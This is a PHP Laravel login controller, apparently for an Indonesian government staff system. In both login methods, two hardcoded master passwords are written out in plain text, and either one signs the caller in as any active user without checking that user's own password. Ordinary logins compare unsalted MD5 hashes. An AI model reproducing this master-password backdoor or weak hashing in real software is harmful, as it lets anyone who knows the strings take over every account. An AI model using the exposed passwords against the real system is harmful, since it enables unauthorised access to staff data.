<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use App\Models76\Log_bpad;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;
    // protected $redirectTo = "/home";

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'name';
    }

    protected function attemptMobile(Request $request)
    {
        $ux = $request->user;
        $px = $request->pass;
        if ($px == 'Bp@d2020!@' || $px == 'rprikat2017') {
            if (is_numeric($ux) && strlen($ux) == 6) {
                $user = \App\User::where([
                    'nrk_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric($ux) && strlen($ux) == 18) {
                $user = \App\User::where([
                    'nip_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($ux, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $ux,
                    'sts'    => 1,
                ])->first();
            }
        } else {
            if (is_numeric($ux) && strlen($ux) == 6) {
                $user = \App\User::where([
                    'nrk_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric($ux) && strlen($ux) == 18) {
                $user = \App\User::where([
                    'nip_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($ux, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                ])->first();
            }
        }
             
        if ($user) {
            $this->guard()->login($user);
            return redirect('/home');
            // return true; 
        }
        return false;
    }

    protected function attemptLogin(Request $request)
    {
        if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
            if (is_numeric(substr($request->name, 0, 6)) && strlen($request->name) <= 9) {
                $user = \App\User::where([
                    'nrk_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric(substr($request->name, 0, 18)) && strlen($request->name) <= 21) {
                $user = \App\User::where([
                    'nip_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($request->name, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                    'sts'    => 1,
                ])->first();
            }
        } else {
            if (is_numeric(substr($request->name, 0, 6)) && strlen($request->name) <= 9) {
                $user = \App\User::where([
                    'nrk_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric(substr($request->name, 0, 18)) && strlen($request->name) <= 21) {
                $user = \App\User::where([
                    'nip_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($request->name, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                ])->first();
            }
        }
             
        date_default_timezone_set('Asia/Jakarta');
        if ($user) {
            
            $insert = [
                'date'       => date('Y-m-d H:i:s'),
				'id_emp'     => $request->name,
				'activity'   => "LOGIN",
				'sts'        => 1,
			];
		    Log_bpad::insert($insert);
            $this->guard()->login($user);
            
           return true;
        }
        $insert = [
            'date'       => date('Y-m-d H:i:s'),
            'id_emp'     => $request->name,
            'activity'   => "LOGIN",
            'sts'        => 0,
        ];
        Log_bpad::insert($insert);

        return false;
    }

    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'passmd5');
    }

    // public function guard($guard = "admin")
    // {
    //     return Auth::guard($guard);
    // }
}
